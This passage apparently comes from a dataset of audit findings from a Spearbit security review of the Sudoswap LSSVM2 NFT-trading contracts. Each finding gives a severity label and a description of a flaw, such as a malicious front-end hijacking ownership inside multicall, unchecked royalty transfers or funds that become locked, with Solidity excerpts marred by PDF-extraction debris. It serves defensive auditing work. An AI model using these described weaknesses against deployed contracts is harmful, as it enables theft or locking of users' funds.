"https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "A malicious router, if accidentally/intentionally whitelisted by the protocol, may implement pair- TransferERC20From() functions which do not actually transfer the number of tokens as expected. This is within the protocol's threat model as evidenced by the use of before-after balance checks on the _assetRecipient for saleAmount. However, similar before-after balance checks are missing for transfers of royalties and protocol fee payments. the protocol/factory intention- Royalty recipients do not receive their royalties from the malicious router if ally/accidentally whitelists one. The protocol/factory may also accidentally whitelist a malicious router that does not transfer even the protocol fee.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Malicious front-end can sneak intermediate ownership changes to perform unauthorized actions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "LSSVMPair implements an onlyOwner multicall function to allow owner to batch multiple calls. Natspec indicates that this is \"Intended for withdrawing/altering pool pricing in one tx, only callable by owner, can- not change owner.\" The check require(owner() == msg.sender, \"Ownership cannot be changed in multi- call\"); with a preceding comment \"Prevent multicall from malicious frontend sneaking in ownership change\" indicates the intent of the check and that a malicious front-end is within the threat model. While the post-loop check prevents malicious front-ends from executing ownership changing calls that attempt to persist beyond the multicall, this still allows one to sneak in an intermediate ownership change during a call -> perform malicious actions under the new unauthorized malicious owner within onOwnershipTransferred() callback -> change ownership back to originally authorized msg.sender owner before returning from the callback and successfully executing any subsequent (onlyOwner) calls and the existing check. While a malicious front-end could introduce many attack vectors that are out-of-scope for detecting/preventing in backend contracts, an unauthorized ownership change seems like a critical one and warrants additional checks for onlyOwner multicall to prevent malicious actions from being executed in the context of any newly/temporarily unauthorized owner.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Missing override in authAllowedForToken prevents authorized admins from toggling settings and reclaiming pairs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Manifold admins are incorrectly not allowed by authAllowedForToken to toggle settings and reclaim their authorized pairs in the protocol context. authAllowedForToken checks for different admin overrides including admin interfaces of NFT marketplaces Nifty, Foundation, Digitalax and ArtBlocks. However, the protocol sup- ports royalties from other marketplaces of Manifold, Rarible, SuperRare and Zora. Of those, Manifold does have getAdmins() interface which is not considered in authAllowedForToken. And it is not certain that the others don't.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Misdirected transfers to invalid pair variants or non-pair recipients may lead to loss/lock of NFTs/tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Functions depositNFTs() and depositERC20() allow deposits of ERC 721 NFTs and ERC20 tokens after pair creation. While they check that the deposit recipient is a valid pair/variant for emitting an event, the deposit transfers happen prior to the check and without the same validation. With dual home tokens (see weird-erc20), the emit could be skipped when the \"other\" token is transferred. Also, the isPair() check in depositNFTs() does not specifically check if the pair variant is ERC721_ERC20 or ERC721_ETH. This allows accidentally misdirected deposits to invalid pair variants or non-pair recipients leading to loss/lock of NFTs/tokens.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "authAllowedForToken() returns prematurely in certain scenarios causing an authentication DoS", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Tokens listed on Nifty or Foundation (therefore returning a valid niftyRegistry or foundationTrea- sury) where the proposedAuthAddress is not a valid Nifty sender or a valid Foundation Treasury admin will cause an authentication DoS if the token were also listed on Digitalax or ArtBlocks and the proposedAuthAddress had admin roles on those platforms. This happens because the return values of valid and isAdmin for isValidNiftySender(proposedAuthAddress) and isAdmin(proposedAuthAddress) respectively are returned as-is instead of returning only if/when they are true but continuing the checks for authorization otherwise (if/when they are false) on Digitalax and ArtBlocks. toggleSettingsForCollection and reclaimPair (which utilize authAllowedForToken) would incorrectly fail for valid proposedAuthAddress in such scenarios. 21 return", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Partial fills don't recycle ETH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "After several fixes are applied, the following code exists. If the sell can be filled completely then ETH is recycled, however when a partial fill is applied then ETH is not recycled. This might lead to a revert and would require doing the trade again. This costs extra gas and the trading conditions might be worse then. function swap(Order calldata swapOrder) external payable returns (uint256[] memory results) { ... // Go through each sell order ... if (pairSpotPrice == order.expectedSpotPrice) { // If the pair is an ETH pair and we opt into recycling ETH, add the output to our total accrued if (order.isETHSell && swapOrder.recycleETH) { ... ... order.pair.swapNFTsForToken(... , payable(address(this)), ... ); } // Otherwise, all tokens or ETH received from the sale go to the token recipient else { ... order.pair.swapNFTsForToken(..., swapOrder.tokenRecipient, ... ); } } // Otherwise we need to do some partial fill calculations first else { ... ... order.pair.swapNFTsForToken(..., swapOrder.tokenRecipient, ... ); // ETH not recycled } // Go through each buy order ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Wrong allowances can be abused by the owner", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function call() allows transferring tokens and NFTs that have an allowance set to the pair. Normally, allowances should be given to the router, but they could be accidentally given to the pair. Although call() is protected by onlyOwner, the pair is created permissionless and so the owner could be anyone.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Malicious router mitigation may break for deflationary tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "ERC20 _pullTokenInputAndPayProtocolFee() for routers has a mitigation for malicious routers by checking if the before-after token balance difference is equal to the transferred amount. This will break for any ERC20 pairs with fee-on-transfer deflationary tokens (see weird-erc20). Note that there has been a real-world exploit related to this with Balancer pool and STA deflationary tokens.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Inconsistent royalty threshold checks allow some royalties to be equal to sale amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Threshold checks on royalty amounts are implemented both in _getRoyaltyAndSpec() and its caller _calculateRoyalties(). While _calculateRoyalties() implements an inclusive check with require(saleAmount >= royaltyTotal, \"Royalty exceeds sale price\");, (allowing royalty to be equal to sale amount) the different checks in _getRoyaltyAndSpec() on the returned amounts or in the calculations on bps in _computeAmounts() exclude the saleAmount forcing royalty to be less than the saleAmount. However, only Known Origin and SuperRare are missing a similar threshold check in _getRoyaltyAndSpec(). This allows only the Known Origin and SuperRare royalties to be equal to the sale amount as enforced by the check in _calculateRoyalties().", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Numerical difference between getNFTQuoteForBuyOrderWithPartialFill() and _findMaxFill- ableAmtForBuy() may lead to precision errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "There is a slight numerical instability between the partial fill calculation and the first client side cal- culation (i.e. getNFTQuoteForSellOrderWithPartialFill() / getNFTQuoteForBuyOrderWithPartialFill(), _- findMaxFillableAmtForBuy() ). This is because getNFTQuoteForSellOrderWithPartialFill() first assumes a buy of 1 item, updates spotPrice/delta, and then gets the next subsequent quote to buy the next item. Whereas _findMaxFillableAmtForBuy() assumes buying multiple items at one time. This can for e.g. Exponential- Curve.sol and XykCurve.sol lead to minor numerical precision errors. function getNFTQuoteForBuyOrderWithPartialFill(LSSVMPair pair, uint256 numNFTs) external view returns ,! (uint256[] memory) { ... for (uint256 i; i < numNFTs; i++) { ... (, spotPrice, delta, price,,) = pair.bondingCurve().getBuyInfo(spotPrice, delta, 1, fee, ...); ... } } function getNFTQuoteForSellOrderWithPartialFill(LSSVMPair pair, uint256 numNFTs) external view returns ,! (uint256[] memory) { ... for (uint256 i; i < numNFTs; i++) { ... (, spotPrice, delta, price,,) = pair.bondingCurve().getSellInfo(spotPrice, delta, 1, fee, ... ); ... } ... } function _findMaxFillableAmtForBuy(LSSVMPair pair, uint256 maxNumNFTs, uint256[] memory ,! maxCostPerNumNFTs, uint256 ... while (start <= end) { ... (...) = pair.bondingCurve().getBuyInfo(spotPrice, delta, (start + end)/2, feeMultiplier, ,! protocolFeeMultiplier); ... } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Differences with Manifold version of RoyaltyEngine may cause unexpected behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Sudoswap has forked RoyaltyEngine from Manifold; however there are some differences. The Manifold version of _getRoyaltyAndSpec() also queries getRecipients(), while the Sudoswap version doesn't. This means the Sudoswap will not spread the royalties over all recipients. function _getRoyaltyAndSpec(...) // Manifold ,! ,! ... try IEIP2981(royaltyAddress).royaltyInfo(tokenId, value) returns (address recipient, uint256 amount) { ... try IRoyaltySplitter(royaltyAddress).getRecipients() returns (Recipient[] memory splitRecipients) { ... } } } function _getRoyaltyAndSpec(...) // Sudoswap ... try IEIP2981(royaltyAddress).royaltyInfo(tokenId, value) returns (address recipient, uint256 ,! amount) { ... } ... } } The Manifold version of getRoyalty() has an extra try/catch compared to the Sudoswap version. This protects against reverts in the cached functions. Note: adding an extra try/catch requires the function _getRoyaltyAnd- Spec() to be external. function getRoyalty(address tokenAddress, uint256 tokenId, uint256 value) ... { // Manifold ... try this._getRoyaltyAndSpec{gas: 100000}(tokenAddress, tokenId, value) returns ( ... ) .... } function getRoyalty(address tokenAddress, uint256 tokenId, uint256 value) ... { // Sudoswap ... ... (...) = _getRoyaltyAndSpec(tokenAddress, tokenId, value); }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Swaps with property-checked ERC1155 sell orders in VeryFastRouter will fail", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Any swap batch of transactions which has a property-checked sell order for ERC1155 will revert. Given that property checks are not supported on ERC1155 pairs (but only ERC721), swap sell orders for ERC1155 in VeryFastRouter will fail if order.doPropertyCheck is accidentally set because the logic thereafter assumes it is an ERC721 order.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "changeSpotPriceAndDelta() reverts when there is enough liquidity to support 1 sell", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "changeSpotPriceAndDelta() reverts when there is enough liquidity to support 1 sell because it uses > instead of >= in the check pairBalance > newPriceToSellToPair.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Lack of support for per-token royalties may lead to incorrect royalty payments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The protocol currently lacks complete support for per-token royalties, assumes that all NFTs in a pair have the same royalty and so considers the first assetId to determine royalties for all NFT token Ids in the pair. If not, the pair owner is expected to make a new pair for NFTs that have different royalties. A pair with NFTs that have different royalties will lead to incorrect royalty payments for the different NFTs.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Missing additional safety for multicall may lead to lost ETH in future", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "If the function multicall() would be payable, then multiple delegated-to functions could use the same msg.value , which could result in losing ETH from the pair. A future upgrade of Solidity might change the default setting for function to payable. See Solidity issue#12539. function multicall(bytes[] calldata calls, bool revertOnFail) external onlyOwner { for (uint256 i; i < calls.length;) { (bool success, bytes memory result) = address(this).delegatecall(calls[i]); ... } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Missing zero-address check may allow re-initialization of pairs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "address(0), \"Initialized\");. However, without a zero-address check on _owner, this can be true even later if the pair is initialized accidentally with address(0) instead of msg.sender. This is because __Ownable_init in OwnableWithTransferCallback does not disallow address(0) unlike transferOwnership. This is however not the case with the current implementation where LSSVMPair.initialize() is called from LSSVMPairFactory with msg.sender as argument for _owner. it Therefore, LSSVMPair.initialize() may be called multiple times.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Trade pair owners are allowed to change asset recipient address when it has no impact", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Trade pair owners are allowed to change their asset recipient address using changeAssetRecipi- ent() while getAssetRecipient() always returns the pair address itself for Trade pairs as expected. Trade pair owners mistakenly assume that they can change their asset recipient address using changeAssetRe- cipient() because they are allowed to do so successfully, but may be surprised to see that it has no effect. They may expect assets at the new address but that will not be the case.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "NFT projects with custom settings and multiple royalty receivers will receive royalty only for first receiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "_calculateRoyalties() and its view equivalent only consider the first royalty receiver when custom settings are enabled. If non-ERC-2981 compliant NFT projects on Manifold/ArtBlocks or other platforms that support multiple royalty receivers come up with custom settings that pair owners subscribe to, then all the royalty will go to the first recipient. Other receivers will not receive any royalties.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Missing non-zero checks allow event emission spamming", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Functions depositNFTs() and depositERC20() are meant to allow deposits into the pair post- creation. However, they do not check if non-zero NFTs or tokens are being deposited. The event emission only checks if the pair recipient is valid. Given their permissionless nature, this allows anyone to grief the system with zero NFT/token deposits causing emission of events which may hinder indexing/monitoring systems.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Missing sanity zero-address checks may lead to undesired behavior or lock of funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Certain logic requires zero-address checks to avoid undesired behavior or lock of funds. For exam- ple, in Splitter.sol#L34 users can permanently lock ETH by mistakenly using safeTransferETH with default/zero- address value.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Legacy NFTs are not compatible with protocol pairs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Pairs support ERC721 and ERC1155 NFTs. However, users of NFT marketplaces may also expect to find OG NFTs such as Cryptopunks, Etherrocks or Cryptokitties, which do not adhere to these ERC standards. For example, Cryptopunks have their own internal marketplace which allows users to trade their NFTs with other users. Given that Cryptopunks does not adhere to the ERC721 standard, it will always fail when the protocol attempts to trade them. Even with wrapped versions of these NFTs, people who aren't aware or have the original version won't be able to trade them in a pair.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Unnecessary payable specifier for functions may allow ETH to be sent and locked/lost", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "LSSVMPair.initialize() which do not expect to receive and process Ether have the payable specifier which allows interacting users to accidentally send them Ether which will get locked/lost. LSSVMRouter.robustSwapERC20ForSpecificNFTsAndNFTsToToken() Functions", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Obsolete Splitter contract may lead to locked ETH/tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "After a pair has be reclaimed via reclaimPair(), pairInfos[] will be emptied and getPrevFeeRe- cipientForPair() will return 0. The obsolete Splitter will however remain present, but any ETH or tokens that are sent to the contract can't be completely retrieved via withdrawETH() and withdrawTokens(). This is because getPrevFeeRecipientForPair() is 0 and the tokens would be send to address(0). It is unlikely though that ETH or tokens are sent to the Splitter contract as it is not used anymore. function withdrawETH(uint256 ethAmount) public { ISettings parentSettings = ISettings(getParentSettings()); ... payable(parentSettings.getPrevFeeRecipientForPair(getPairAddressForSplitter())).safeTransferETH(... ); ,! } function withdrawTokens(ERC20 token, uint256 tokenAmount) public { ISettings parentSettings = ISettings(getParentSettings()); ... token.safeTransfer(parentSettings.getPrevFeeRecipientForPair(getPairAddressForSplitter()), ... ); c } function getPrevFeeRecipientForPair(address pairAddress) public view returns (address) { return pairInfos[pairAddress].prevFeeRecipient; } function reclaimPair(address pairAddress) public { ... delete pairInfos[pairAddress]; ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Divisions in getBuyInfo() and getSellInfo() may be rounded down to 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "In extreme cases (e.g. tokens with a few decimals, see this example), divisions in getBuyInfo() and getSellInfo() may be rounded down to 0. This means inputValueWithoutFee and/or outputValueWithoutFee may be 0. function getBuyInfo(..., uint256 numItems, ... ) ... { ... uint256 inputValueWithoutFee = (numItems * tokenBalance) / (nftBalance - numItems); ... } function getSellInfo(..., uint256 numItems, ... ) ... { ... uint256 outputValueWithoutFee = (numItems * tokenBalance) / (nftBalance + numItems); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Last NFT in an XykCurve cannot be sold", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function getBuyInfo() of XykCurve enforces numItems < nftBalance, which means the last NFT can never be sold. One potential solution as suggested by the Sudoswap team is to set delta (=nftBalance) one higher than the real amount of NFTs. This could cause problems in other parts of the code. For example, once only one NFT is left, if we try to use changeSpotPriceAndDelta(), getBuyNFTQuote(1) will error and thus the prices (tokenBalance) and delta (nftBalance) can't be changed anymore. If nftBalance is set to one higher, then it won't satisfy pair.nft().balanceOf(pairAddress) >= 1. 31 contract XykCurve ... { function getBuyInfo(..., uint256 numItems, ... ) ... { ... uint256 tokenBalance = spotPrice; uint256 nftBalance = delta; ... // If numItems is too large, we will get divide by zero error if (numItems >= nftBalance) { return (Error.INVALID_NUMITEMS, 0, 0, 0, 0, 0); } ... } } function changeSpotPriceAndDelta(...) ... { ... (,,, uint256 priceToBuyFromPair,) = pair.getBuyNFTQuote(1); ... if (... && pair.nft().balanceOf(pairAddress) >= 1) { pair.changeSpotPrice(newSpotPrice); pair.changeDelta(newDelta); return; } ... } function getBuyNFTQuote(uint256 numNFTs) ... { (error, ...) = bondingCurve().getBuyInfo(..., numNFTs, ...); }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Allowing different ERC20 tokens in LSSVMRouter swaps will affect accounting and lead to unde- fined behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "As commented \"Note: All ERC20 swaps assume that a single ERC20 token is used for all the pairs involved. * Swapping using multiple tokens in the same transaction is possible, but the slippage checks * & the return values will be meaningless and may lead to undefined behavior.\" This assumption may be risky if users end up mistakenly using different ERC20 tokens in different swaps. Summing up their inputAmount and remainingValue will not be meaningful and lead to accounting errors and undefined behavior (as noted).", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Missing array length equality checks may lead to incorrect or undefined behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Functions taking two array type parameters and not checking that their lengths are equal may lead to incorrect or undefined behavior when accidentally passing arrays of unequal lengths.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Owners may have funds locked if newOwner is EOA in transferOwnership()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "In transferOwnership(), if newOwner has zero code.length (i.e. EOA), newOwner.isContract() will be false and therefore, if block will be ignored. As the function is payable, any msg.value from the call would get locked in the contract. Note: ERC20 pairs and StandardSettings don't have a method to recover ETH.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Use of transferFrom may lead to NFTs getting locked forever", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "ERC721 NFTs may get locked forever if the recipient is not aware of ERC721 for some reason. While safeTransferFrom() is used for ERC1155 NFTs (which has the _doSafeTransferAcceptanceCheck check on recipient and does not have an option to avoid this), transferFrom() is used for ERC721 NFTs presumably for gas savings and reentrancy concerns over its safeTransferFrom variant (which has the _checkOnERC721Received check on the recipient).", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Single-step ownership change introduces risks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Single-step ownership transfers add the risk of setting an unwanted owner by accident (this includes address(0)) if the ownership transfer is not done with excessive care. The ownership control library Owned by Solmate implements a simple single-step ownership transfer without zero-address checks.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "getAllPairsForSettings() may run out of gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function getAllPairsForSettings() has a loop over pairsForSettings. As the creation of pairs is permissionless, that array could get arbitrarily large. Once the array is large enough, the function will run out of gas. Note: the function is only called from the outside. function getAllPairsForSettings(address settings) external view returns (address[] memory) { uint256 numPairs = pairsForSettings[settings].length(); ... for (uint256 i; i < numPairs;) { ... unchecked { ++i; } } ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Partially implemented SellOrderWithPartialFill functionality may cause unexpected behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "pair.spotPrice() == order.expectedSpotPrice in a swap. This may be confusing to users who expect partial fills in both directions but notice unexpected behavior if deployed as-is. While the BuyOrderWithPartialFill functionality is fully implemented, the corresponding SellOrderWithPartialFill feature is partially implemented with getNFTQuoteForSellOrderWithPartialFill, an incomplete _findMaxFillableAmtForSell (placeholder comment: \"// TODO: implement\") and other supporting logic required in swap().", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Lack of deadline checks for certain swap functions allows greater exposure to volatile market prices", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Many swap functions in LSSVMRouter use the checkDeadline modifier to prevent swaps from execut- ing beyond a certain user-specified deadline. This is presumably to reduce exposure to volatile market prices on top of the thresholds of maxCost for buys and minOutput for sells. However two router functions robustSwapETH- ForSpecificNFTsAndNFTsToToken and robustSwapERC20ForSpecificNFTsAndNFTsToToken in LSSVMRouter and all functions in VeryFastRouter are missing this modifier and the user parameter required for it. Users attempting to swap using these two swap functions do not have a way to specify a deadline for their execution unlike the other swap functions in this router. If the front-end does not highlight or warn about this, then the user swaps may get executed after a long time depending on the tip included in the transaction and the network congestion. This causes greater exposure for the swaps to volatile market prices.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Missing function to deposit ERC1155 NFTs after pair creation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Functions depositNFTs() and depositERC20() are apparently used to deposit ERC721 NFTs and ERC20s into appropriate pairs after their creation. According to the project team, this is used \"for various UIs to consolidate approvals + emit a canonical event for deposits.\" However, an equivalent function for depositing ERC1155 NFTs is missing. This prevents ERC1155 NFTs from being deposited into pairs after creation for scenarios anticipated similar to ERC721 NFTs and ERC20 tokens.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Reading from state is more gas expensive than using msg.sender", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Solmate's Owned.sol contract implements the concept of ownership (by saving during contract con- struction the deployer in the owner state variable) and owner-exclusive functions via the onlyOwner() modifier. Therefore, within functions protected by the onlyOwner() modifier, the addresses stored in msg.sender and owner will be equal. So, if a function of said characteristics has to make use of the address of the owner, it is cheaper to use msg.sender than owner, because the latter reads from the contract state (using SLOAD opcode) while the former doesn't (address is directly retrieved via the cheaper CALLER opcode). Reading from state (SLOAD opcode which costs either 100 or 2100 gas units) costs more gas than using the msg.sender environmental variable (CALLER opcode which costs 2 units of gas). Note: withdrawERC20() already uses msg.sender function withdrawETH(uint256 amount) public onlyOwner { payable(owner()).safeTransferETH(amount); ... } function withdrawERC20(ERC20 a, uint256 amount) external override onlyOwner { a.safeTransfer(msg.sender, amount); }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "pair.factory().protocolFeeMultiplier() is read from storage on every iteration of the loop wast- ing gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Not caching storage variables that are accessed multiple times within a loop causes waste of gas. If not cached, the solidity compiler will always read the value of protocolFeeMultiplier from storage during each iteration. For a storage variable, this implies extra SLOAD operations (100 additional gas for each iteration beyond the first). In contrast, for a memory variable, it implies extra MLOAD operations (3 additional gas for each iteration beyond the first).", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "The use of factory in ERC1155._takeNFTsFromSender() can be via a parameter rather than calling factory() again", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "factory is being sent as a parameter to _takeNFTsFromSender in LSSVMPairERC721.sol#L179, which is saving gas because it is not required to read the value again. _takeNFTsFromSender(IERC721(nft()), nftIds, _factory, isRouter, routerCaller); However, in LSSVMPairERC1155.sol#L181, the similar function _takeNFTsFromSender() gets the value by calling factory() instead of using a parameter. _takeNFTsFromSender(IERC1155(nft()), numNFTs[0], isRouter, routerCaller); This creates an unnecessary asymmetry between the two contracts which are expected to be similar and also a possible gas optimization by avoiding a call to the factory getter.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Variables only set at construction time could be made immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "immutable variables can be assigned either at construction time or at declaration time, and only once. The contract creation code generated by the compiler will modify the contracts runtime code before it is returned by replacing all references to immutable variables by the values assigned to the them; so the compiler does not reserve a storage slot for these variables. Declaring variables only set at construction time as immutable results in saving one call per variable to SSTORE (0x55) opcode, thus saving gas during construction.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Hoisting check out of loop will save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The check numIdsFound == maxIdsNeeded will never be true before the outer for loop finishes iterating over maxIdsNeeded because numIdsFound is conditionally incremented only by 1 in each iteration.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Functionality of safeBatchTransferFrom() is not used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function pairTransferERC1155From() allow that transfer of multiple id's of ERC1155 NFTs. The rest of the code only uses one id at a time. Using safeTransferFrom() instead of safeBatchTransferFrom(), might be better as it only accesses one id and uses less gas because no for loop is necessary. However future version of Sudoswap might support multiple ids. In that case its better to leave as is. function pairTransferERC1155From(..., uint256[] calldata ids, uint256[] calldata amounts,...) ... { ... nft.safeBatchTransferFrom(from, to, ids, amounts, bytes(\"\")); }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Using != 0 instead of > 0 can save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "When dealing with unsigned integer types, comparisons with != 0 are 3 gas cheaper than > 0.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Using >>1 instead of /2 can save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "A division by 2 can be calculated by shifting one to the right (>>1). While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Retrieval of ether balance of contract can be gas optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The retrieval of the ether balance of a contract is typically done with address(this).balance. However, by using an assembly block and the selfbalance() instruction, one can get the balance with a discount of 15 units of gas.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Function parameters should be validated at the very beginning for gas optimizations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Function parameters should be validated at the very beginning of the function to allow typical execu- tion paths and revert on the exceptional paths, which will lead to gas savings 